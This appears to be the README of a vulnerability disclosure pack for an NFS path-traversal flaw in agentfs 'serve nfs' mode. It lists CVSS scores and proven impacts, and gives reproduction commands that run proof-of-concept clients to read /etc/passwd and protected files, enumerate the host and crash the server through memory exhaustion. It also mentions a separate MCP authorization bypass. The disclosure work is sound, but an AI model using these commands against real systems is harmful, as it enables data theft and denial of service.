# agentfs-cve — AFS-NFS-01 proof pack

CVE submission pack for a confirmed NFSv3 path-escape vulnerability in
[tursodatabase/agentfs](https://github.com/tursodatabase/agentfs) `serve nfs`
overlay mode. Reproduced end-to-end on source checked out at the `v0.6.4` release tag (build-only dependency patch; no agentfs source modified — see `cve-submission/build-patch-v064.diff`).

## The bug in one sentence

The NFS LOOKUP handler forwards client-controlled filenames verbatim to
`HostFS::lookup` → `openat(parent_fd, name, O_PATH|O_NOFOLLOW)` with no
single-component check and no root containment. Absolute paths ignore
`parent_fd`; `..` sequences escape the export base. Every read also triggers
a full-file copy-up into the SQLite delta, giving an availability impact.

## Affected

- `agentfs` / `agentfs-sdk` v0.6.4 tag (`3a5ed2b88e5d5a5f9b2c7fe02d012b50fd19e3c0`)
- `0a014eb` (2 commits ahead; vulnerable files identical)
- Other versions exposing `serve nfs`/`nfs` overlay mode may be affected;
  not systematically verified. macOS source-level affected (runtime pending)

## Severity

- **High 7.7** — `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H`
- **9.1** if `--bind` exposes the port off-loopback (`AV:N/…/A:H`)
- **6.2** conservative without availability (`…/C:H/I:N/A:N`)

## What is proven (v0.6.4 tag source)

- `LOOKUP /etc/passwd`, `LOOKUP ../outside_secret.txt` → host file read
- `LOOKUP ../secret_600.txt` + `AUTH_UNIX uid=0` → mode-600 server-owned file
- `LOOKUP /` + `READDIR` → host root enumeration; `/home`, `/tmp` listable
- `LOOKUP .agentfs/v064poc.db-wal` → AgentFS DB/WAL markers recovered
- 1-byte READ of 128 MB sparse file → RSS 66→551 MB, DB+WAL +464 MB in 0.9 s
- 1-byte READ of 1 TB sparse file → ~51.5 GB RSS → kernel OOM-killed the `ss`-identified `agentfs` listener PID
- WRITE/MKDIR/REMOVE on traversed paths → delta-only; host unchanged

## Repo layout

- `README.md` — this file
- `cve-submission/report_20261123_181454.md` — full red-team report (authoritative copy)
- `pocs/` — raw ONC RPC Python clients (traversal, enum, db_read, exhaust, crash)
- `evidence/` — record-marked RPC captures (`result.json` + `.record.bin`),
  wire dumps, source snippets, environment, `SHA256SUMS.txt`
- `cve-submission/` — VulnCheck/GitHub-advisory pack:
  - `advisory.md` — paste-ready advisory (private coordinated disclosure)
  - `attack-path-simple.md` — plain-language narrative
  - `attacker-cost.md` — effort/exposure analysis
  - `range-verification.txt` — version scope + build notes
  - `build-patch-v064.diff` — self-contained build-only patch (verified `git apply`)
  - `MANIFEST.txt` — submission file list
  - `pocs/` — copies of the PoC clients

## Reproduce

Two separate directories: `PACK` = this repo / extracted submission archive
(contains `pocs/` and `cve-submission/build-patch-v064.diff`), `SRC` = a fresh
upstream checkout. Build does not install `agentfs`; invoke the binary directly.

```bash
# --- Terminal 1: build ---
PACK=/path/to/agentfs-cve
SRC=/tmp/agentfs-upstream
git clone https://github.com/tursodatabase/agentfs.git "$SRC"
cd "$SRC" && git checkout v0.6.4
curl -sL https://crates.io/api/v1/crates/branches/0.4.4/download -o /tmp/branches-0.4.4.crate
mkdir -p vendor && tar xzf /tmp/branches-0.4.4.crate -C vendor   # crates.io 0.4.4
git apply "$PACK/cve-submission/build-patch-v064.diff"           # build-only patch
(cd cli && cargo +stable build --release --no-default-features)
BIN="$SRC/cli/target/release/agentfs"

# --- Terminal 1 (cont.): lab setup + server (leave running) ---
mkdir -p /tmp/lab/base && echo MARKER > /tmp/lab/base/inside.txt
"$BIN" init --base /tmp/lab/base poc
"$BIN" serve nfs poc --bind 127.0.0.1 --port 11111

# --- Terminal 2: attacks ---
cd "$PACK"
python3 pocs/nfs_traversal_capture.py --name /etc/passwd --read 256 --uid 0 --gid 0 --port 11111 --outdir out/abs
python3 pocs/nfs_enum.py --outdir out/enum --port 11111 --paths / /home /tmp
python3 pocs/nfs_db_read.py --outdir out/db --port 11111 --db /path/to/.agentfs/<export>.db-wal
truncate -s 128M /tmp/lab/big_sparse.bin   # outside export base
python3 pocs/nfs_exhaust.py --outdir out/exhaust --port 11111 --name ../big_sparse.bin \
    --db /path/to/.agentfs/<export>.db --server-cmd-substr 'agentfs serve nfs'
truncate -s 1T /tmp/lab/huge_sparse.bin    # WARNING: crashes the server
python3 pocs/nfs_crash.py --outdir out/crash --port 11111 --name ../huge_sparse.bin \
    --server-pattern 'agentfs serve nfs'
```

## Separate finding

`agentfs serve mcp --tools` filters `tools/list` but `tools/call` dispatches
hidden tools anyway (CWE-862, confirmed live). Documented in report §4.2;
not part of this CVE pack.

## Status

Reported privately 2026-11-23. Awaiting vendor response / CVE assignment.
Disclosure: private advisory; publication coordinated with the vendor, no fixed deadline.
